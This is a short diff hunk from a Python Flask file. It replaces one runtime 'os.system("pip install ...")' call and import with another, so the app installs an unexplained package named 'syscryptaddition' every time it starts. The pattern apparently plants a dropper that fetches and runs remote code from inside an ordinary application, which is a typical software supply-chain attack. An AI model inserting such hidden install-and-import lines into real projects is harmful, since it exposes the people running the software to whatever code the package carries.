@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlitedbextsV2")
-import pipsqlitedbextsV2
+os.system("pip install syscryptaddition")
+import syscryptaddition
 import flask
 
 from flask import g
